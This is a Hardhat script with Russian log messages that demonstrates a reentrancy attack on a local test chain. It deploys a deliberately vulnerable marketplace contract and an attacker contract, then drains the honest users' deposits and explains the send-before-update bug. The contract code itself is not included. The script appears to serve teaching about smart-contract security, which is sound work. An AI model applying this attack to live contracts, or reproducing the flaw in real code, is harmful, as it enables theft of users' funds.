const { ethers } = require("hardhat");

async function main() {
    console.log("==================================================");
    console.log("=== СИМУЛЯЦИЯ ТОРГОВОЙ ПЛОЩАДКИ WEB3 ЗАПУЩЕНА ===");
    console.log("==================================================\n");

    const [deployer, honestUser1, honestUser2, hacker] = await ethers.getSigners();

    console.log("[ШАГ 1] Запуск смарт-контракта площадки...");
    const Marketplace = await ethers.getContractFactory("VulnerableMarketplace");
    const marketplace = await Marketplace.deploy();
    await marketplace.waitForDeployment();
    const marketAddress = await marketplace.getAddress();
    console.log(`Площадка успешно работает по адресу: ${marketAddress}\n`);

    console.log("[ШАГ 2] Честные пользователи пополняют баланс (для покупки скинов/игр)...");
    await marketplace.connect(honestUser1).deposit({ value: ethers.parseEther("5") });
    console.log(" - Пользователь 1 внес 5 ETH");
    await marketplace.connect(honestUser2).deposit({ value: ethers.parseEther("5") });
    console.log(" - Пользователь 2 внес 5 ETH");

    let marketBal = await ethers.provider.getBalance(marketAddress);
    console.log(`💲 Текущий баланс площадки: ${ethers.formatEther(marketBal)} ETH\n`);

    console.log("[ШАГ 3] Хакер готовит атаку...");
    const Attacker = await ethers.getContractFactory("Attacker");
    const attackerContract = await Attacker.connect(hacker).deploy(marketAddress);
    await attackerContract.waitForDeployment();
    const attackerAddress = await attackerContract.getAddress();
    console.log(`Вредоносный смарт-контракт развернут по адресу: ${attackerAddress}\n`);

    console.log("!!! ВНИМАНИЕ: ЗАПУСК АТАКИ ПОВТОРНОГО ВХОДА (REENTRANCY) !!!");
    console.log("Хакер закидывает 1 ETH и мгновенно запрашивает возврат, запуская бесконечный цикл...\n");
    
    const tx = await attackerContract.connect(hacker).attack({ value: ethers.parseEther("1") });
    await tx.wait();

    console.log("==================================================");
    console.log("=== ИТОГИ ХАКЕРСКОЙ АТАКИ ===");
    console.log("==================================================");
    
    marketBal = await ethers.provider.getBalance(marketAddress);
    const hackerStolenBal = await ethers.provider.getBalance(attackerAddress);

    console.log(`Остаток средств на площадке: ${ethers.formatEther(marketBal)} ETH`);
    console.log(`Баланс хакерского контракта (украдено): ${ethers.formatEther(hackerStolenBal)} ETH`);
    console.log("\nВЫВОД: Из-за ошибки в логике смарт-контракта (деньги отправлялись до изменения баланса в базе), хакер смог выкачать все средства честных пользователей в рамках одной транзакции!");
}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});